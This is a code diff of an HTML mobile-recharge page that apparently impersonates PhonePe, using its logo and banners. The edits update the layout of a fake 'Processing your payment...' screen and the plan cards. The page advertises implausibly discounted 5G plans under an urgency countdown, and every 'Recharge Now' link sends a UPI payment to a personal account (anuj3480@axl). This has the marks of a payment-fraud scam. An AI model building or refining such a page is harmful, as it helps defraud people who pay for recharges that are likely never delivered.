@@ -116,16 +116,17 @@
         .footer-banner img { max-width: 100%; height: auto; border-radius: 8px; display: block; margin: 0 auto; }
         #validationMessage { color: red; font-size: 14px; text-align: center; margin-top: -15px; margin-bottom: 15px; display: none; }
         
-        /* --- STYLES FOR PAGE 3: PAYMENT PROCESSING --- */
+        /* --- STYLES FOR PAGE 3: PAYMENT PROCESSING (UPDATED) --- */
         .processing-page-body { display: flex; flex-direction: column; min-height: 100vh; background-color: #fff;}
-        .processing-header {
-            display: flex; justify-content: space-between; align-items: center; padding: 15px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.05); width: 100%; box-sizing: border-box;
+        
+        .payment-header-image {
+            width: 100%;
+            height: auto;
         }
-        .processing-header-left { display: flex; align-items: center; }
-        .processing-menu-icon { font-size: 24px; margin-right: 15px; color: #673ab7; }
-        .processing-phonepe-logo img { height: 28px; }
-        .processing-profile-icon { width: 32px; height: 32px; background-color: #673ab7; border-radius: 50%; }
+        .payment-header-image img {
+            width: 100%;
+            display: block;
+        }
         
         .processing-main-content {
             flex-grow: 1; display: flex; flex-direction: column; justify-content: center;
@@ -153,7 +154,7 @@
             <div class="image-banner">
                 <img src="https://i.supaimg.com/ce61abad-e562-421b-8e6b-0cb4b33b3d77.png" alt="Recharge Banner Image">
             </div>
-            <div class="special-offer">
+           <div class="special-offer">
                 <span class="timer-icon">&#9200;</span> Special Offer Ends In: <span id="countdown-timer">10:00</span>
             </div>
             <div class="recharge-section">
@@ -189,35 +190,27 @@
         <div class="main-content">
             <div class="section-heading"><span class="heading-new-tag">NEW!</span><span>RECHARGE & OFFERS</span></div>
             
-            <!-- PLAN 1 -->
+            <!-- All 5 Plan Cards -->
             <div class="plan-card">
                 <div class="plan-header"><div class="plan-price-group"><span class="plan-new-tag-above-price">NEW!</span><div class="plan-prices"><span class="plan-price-current">₹99.00</span><span class="plan-price-original">₹299</span></div></div><div class="unlimited-5g-data-tag">UNLIMITED TRUE 5G DATA</div></div>
                 <div class="plan-details"><div class="detail-item"><div class="detail-value">28 Days</div><div class="detail-label">VALIDITY</div></div><div class="detail-item"><div class="detail-value">2 GB/day</div><div class="detail-label">DATA</div></div><div class="detail-item"><div class="detail-value">Unlimited</div><div class="detail-label">Voice</div></div><div class="detail-item"><div class="detail-value">100/day</div><div class="detail-label">SMS</div></div></div><div class="detail-item" style="text-align: left; margin-bottom: 15px;"><div class="detail-value">No OTT</div></div>
                 <a class="recharge-button" href="upi://pay?pa=anuj3480@axl&pn=Anuj%20Recharge&am=99&cu=INR" onclick="handlePayment(event)">Recharge Now</a>
             </div>
-
-            <!-- PLAN 2 -->
             <div class="plan-card">
                 <div class="plan-header"><div class="plan-price-group"><span class="plan-new-tag-above-price">NEW!</span><div class="plan-prices"><span class="plan-price-current">₹199.00</span><span class="plan-price-original">₹579</span></div></div><div class="unlimited-5g-data-tag">UNLIMITED TRUE 5G DATA</div></div>
                 <div class="plan-details"><div class="detail-item"><div class="detail-value">56 Days</div><div class="detail-label">VALIDITY</div></div><div class="detail-item"><div class="detail-value">2 GB/day</div><div class="detail-label">DATA</div></div><div class="detail-item"><div class="detail-value">Unlimited</div><div class="detail-label">Voice</div></div><div class="detail-item"><div class="detail-value">100/day</div><div class="detail-label">SMS</div></div></div><div class="detail-item" style="text-align: left;"><div class="detail-value">Amazon Music</div></div>
                 <a class="recharge-button" href="upi://pay?pa=anuj3480@axl&pn=Anuj%20Recharge&am=199&cu=INR" onclick="handlePayment(event)">Recharge Now</a>
             </div>
-
-            <!-- PLAN 3 -->
             <div class="plan-card">
                 <div class="plan-header"><div class="plan-price-group"><span class="plan-new-tag-above-price">NEW!</span><div class="plan-prices"><span class="plan-price-current">₹219.99</span><span class="plan-price-original">₹629</span></div></div><div class="unlimited-5g-data-tag">UNLIMITED TRUE 5G DATA</div></div>
                 <div class="plan-details"><div class="detail-item"><div class="detail-value">56 Days</div><div class="detail-label">VALIDITY</div></div><div class="detail-item"><div class="detail-value">2.5 GB/day</div><div class="detail-label">DATA</div></div><div class="detail-item"><div class="detail-value">Unlimited</div><div class="detail-label">Voice</div></div><div class="detail-item"><div class="detail-value">100/day</div><div class="detail-label">SMS</div></div></div><div class="detail-item" style="text-align: left; margin-bottom: 15px;"><div class="detail-value">OTT + Music</div></div>
                 <a class="recharge-button" href="upi://pay?pa=anuj3480@axl&pn=Anuj%20Recharge&am=219.99&cu=INR" onclick="handlePayment(event)">Recharge Now</a>
             </div>
-
-            <!-- PLAN 4 -->
             <div class="plan-card">
                 <div class="plan-header"><div class="plan-price-group"><span class="plan-new-tag-above-price">NEW!</span><div class="plan-prices"><span class="plan-price-current">₹249.00</span><span class="plan-price-original">₹799</span></div></div><div class="unlimited-5g-data-tag">UNLIMITED TRUE 5G DATA</div></div>
                 <div class="plan-details"><div class="detail-item"><div class="detail-value">90 Days</div><div class="detail-label">VALIDITY</div></div><div class="detail-item"><div class="detail-value">2 GB/day</div><div class="detail-label">DATA</div></div><div class="detail-item"><div class="detail-value">Unlimited</div><div class="detail-label">Voice</div></div><div class="detail-item"><div class="detail-value">100/day</div><div class="detail-label">SMS</div></div></div><div class="detail-item" style="text-align: left; margin-bottom: 15px;"><div class="detail-value">Netflix + Prime</div></div>
                 <a class="recharge-button" href="upi://pay?pa=anuj3480@axl&pn=Anuj%20Recharge&am=249&cu=INR" onclick="handlePayment(event)">Recharge Now</a>
             </div>
-
-            <!-- PLAN 5 -->
             <div class="plan-card">
                 <div class="plan-header"><div class="plan-price-group"><span class="plan-new-tag-above-price">NEW!</span><div class="plan-prices"><span class="plan-price-current">₹599.00</span><span class="plan-price-original">₹2849</span></div></div><div class="unlimited-5g-data-tag">UNLIMITED TRUE 5G DATA</div></div>
                 <div class="plan-details"><div class="detail-item"><div class="detail-value">365 Days</div><div class="detail-label">VALIDITY</div></div><div class="detail-item"><div class="detail-value">3 GB/day</div><div class="detail-label">DATA</div></div><div class="detail-item"><div class="detail-value">Unlimited</div><div class="detail-label">Voice</div></div><div class="detail-item"><div class="detail-value">100/day</div><div class="detail-label">SMS</div></div></div><div class="detail-item" style="text-align: left; margin-bottom: 15px;"><div class="detail-value">Disney+ Hotstar + SonyLIV</div></div>
@@ -228,15 +221,15 @@
         <div class="footer-banner"><img src="https://i.supaimg.com/ff7970a0-66e0-4106-9b7e-4eead29979c8.png" alt="PhonePe Footer Banner"></div>
     </div>
 
-    <!-- PAGE 3: PAYMENT PROCESSING (Initially hidden) -->
+    <!-- PAGE 3: PAYMENT PROCESSING (UPDATED HTML STRUCTURE) -->
     <div id="paymentProcessingPage" style="display: none;" class="processing-page-body">
-        <div class="processing-header">
-            <div class="processing-header-left">
-                <div class="processing-menu-icon">&#9776;</div>
-                <div class="processing-phonepe-logo"><img src="https://i.supaimg.com/73d93214-ce37-4909-a16d-7390d4eed30f.jpg" alt="PhonePe Logo"></div>
-            </div>
-            <div class="processing-profile-icon"></div>
+        
+        <!-- Full-width image header -->
+        <div class="payment-header-image">
+            <!-- ===== ADD YOUR IMAGE URL HERE ===== -->
+            <img src="https://i.supaimg.com/6696e00f-1745-4553-8771-4576354568fd.jpg" alt="Payment Header">
         </div>
+
         <div class="processing-main-content">
             <div class="loader"></div>
             <div class="processing-text-heading">Processing your payment...</div>
